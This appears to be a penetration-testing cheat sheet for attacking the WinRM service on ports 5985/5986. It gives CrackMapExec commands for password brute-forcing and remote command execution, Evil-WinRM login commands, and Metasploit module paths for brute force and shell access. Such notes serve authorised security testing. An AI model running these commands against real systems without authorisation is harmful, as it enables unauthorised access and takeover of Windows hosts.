---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 5985,5986 -> WinRM

## CrackMapExec

is a powerful tool dubbed as _<mark style="color:green;">swiss army knife</mark>_ for pentesting Windows/Active Directory environments.

```bash
# Bruteforce WinRM creds
crackmapexec winrm $IP -u Administrator -p /wordlists/passwords.txt

# Execute command with AUTHENTICATION
crackmapexec winrm $IP -u Administrator -p password123 -x "whoami"
```

## Evil-WinRM

is a tool that was developed using Ruby. The main purpose of this tool is that an attacker can use Powershell to interact with the target through WinRM protocol.

```bash
# Login with AUTHENTICATION
evil-winrm -i $IP -u Administrator -p password123

# Login with CERTIFICATES / SSL
evil-winrm -S -c pub.key -k decrypted_priv.key -i $IP
```

## MSFconsole

is a framework that holds many exploits, backdoors, scanners, etc. This is also known as _<mark style="color:green;">Metasploit</mark>_, by default, it is installed on Kali Linux.

```bash
# Checking AUTHENTICATION methods
auxiliary/scanner/winrm/winrm_auth_methods

# Running cmd with AUTHENTICATION
auxiliary/scanner/winrm/winrm_cmd

# brute-force
auxiliary/scanner/winrm/winrm_login

# RCE (get the shell/meterpreter) AUTHENTICATION
# if you can't run it [BUG]; make sure to (set FORCE_VBS true)
exploit/windows/winrm/winrm_script_exec
```
